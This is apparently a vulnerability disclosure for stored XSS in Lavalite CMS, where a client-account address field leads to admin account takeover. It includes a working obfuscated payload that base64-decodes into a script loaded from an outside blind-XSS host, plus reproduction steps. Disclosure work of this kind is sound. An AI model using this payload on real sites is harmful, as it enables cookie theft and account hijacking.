# Description
Admin cookies and other details leading to an account take over to a higher level privilege from a client account of lavalite CMS and other multiple XSS in different pages due to acceptance of unsanitised data .check the permalinks to know more on the pages causing XSS.
# Payload
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# Proof of Concept for Account Takeover
* login to client account and admin account from entirely different browsers or through a private mode.
* In the client account click on settings and update the address column with the blind payload and save the updates made.
* from the admin account move to the end point http://localhost/admin/user/client .
* Booyah!!! XSS triggered.
* other POC's are available at the corresponding PR pages